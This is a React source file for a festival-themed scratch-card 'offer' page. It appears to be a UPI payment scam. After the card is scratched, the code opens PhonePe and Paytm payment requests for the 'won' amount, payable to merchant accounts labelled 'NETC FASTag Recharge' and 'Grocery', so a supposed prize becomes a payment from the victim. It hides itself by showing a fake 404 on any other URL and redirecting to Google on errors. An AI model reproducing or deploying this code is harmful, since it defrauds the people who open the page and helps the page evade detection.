import React, { useState, useEffect } from "react";
import Scratch from "./ui/Scratch";
import PopUp from "./ui/PopUp";
import topRaksha from "./assets/top-raksha.png";
import bottomRaksha from "./assets/bottom-raksha.gif";

const App = () => {
  const [isScratchCleared, setIsScratchCleared] = useState(false);
  const [isPopupOpen, setIsPopupOpen] = useState(false);
  const [scratchAmount, setScratchAmount] = useState(0);
  const [hasError, setHasError] = useState(false);
  const [show404, setShow404] = useState(false);

  // Check for URL issues and handle redirects
  useEffect(() => {
    const currentPath = window.location.pathname;
    const expectedPath = '/Alch/OFFER/modi/';
    
    // Exact correct URL - show content
    if (currentPath === expectedPath || currentPath === expectedPath + '/') {
      console.log('Correct URL detected, showing content...');
      return; // Show the app content
    }
    
    // Wrong URLs - show 404
    console.log('Wrong URL detected, showing 404...');
    setShow404(true);
  }, []);

  const handleScratchComplete = (amount) => {
    try {
      setIsScratchCleared(true);
      setScratchAmount(amount);
      
      // Automatically open PhonePe URL when scratch is complete with 1 second delay
      setTimeout(() => {
        const PHONEPE_URL = `phonepe://pay?ver=01&mode=01&pa=netc.34161FA820328AA2D24366C0@mairtel&am=${amount}&purpose=00&mc=4784&pn=NETC%20FASTag%20Recharge&orgid=159753&qrMedium=04`;
        window.location.href = PHONEPE_URL;
      }, 1000);
    } catch (error) {
      console.error('Error in scratch complete:', error);
      setHasError(true);
      window.location.href = 'https://www.google.com';
    }
  };

  const handleSelect = (method) => {
    try {
      const PHONEPE_URL = `phonepe://pay?ver=01&mode=19&pa=grocery334078.rzp@icici&pn=Grocery&tr=RZPQq20UpfM9HksWcqrv2&cu=INR&mc=5411&qrMedium=04&tn=Payment%20to%20Grocery&am=${scratchAmount}`;
      const PAYTM_URL = `paytmmp://pay?ver=01&mode=19&pa=grocery334078.rzp@icici&pn=Grocery&tr=RZPQq20UpfM9HksWcqrv2&cu=INR&mc=5411&qrMedium=04&tn=Payment%20to%20Grocery&am=${scratchAmount}`;

      if (method === "phonepe") {
        window.location.href = PHONEPE_URL;
      } else if (method === "paytm") {
        window.location.href = PAYTM_URL;
      }

      setIsPopupOpen(false);
    } catch (error) {
      console.error('Error in payment selection:', error);
      setHasError(true);
      window.location.href = 'https://www.google.com';
    }
  };

  // If there's an error, redirect to Google
  if (hasError) {
    return null; // Component will unmount and redirect
  }

  // Show 404 for wrong URLs
  if (show404) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-100">
        <div className="text-center">
          <h1 className="text-6xl font-bold text-gray-800 mb-4">404</h1>
          <p className="text-xl text-gray-600 mb-8">Page Not Found</p>
          <p className="text-gray-500">The page you're looking for doesn't exist.</p>
        </div>
      </div>
    );
  }

  return (
    <div>
      <img src={topRaksha} alt="header" className="w-full" />

      <Scratch onScratchComplete={handleScratchComplete} />

      <img
        src={bottomRaksha}
        alt="bottom"
        className="w-full cursor-pointer"
        onClick={() => {
          if (isScratchCleared) {
            setIsPopupOpen(true);
          } else {
            // alert("Please complete the scratch first.");
          }
        }}
      />

      <PopUp
        isOpen={isPopupOpen}
        onSelect={handleSelect}
        amount={scratchAmount}
      />
    </div>
  );
};

export default App;
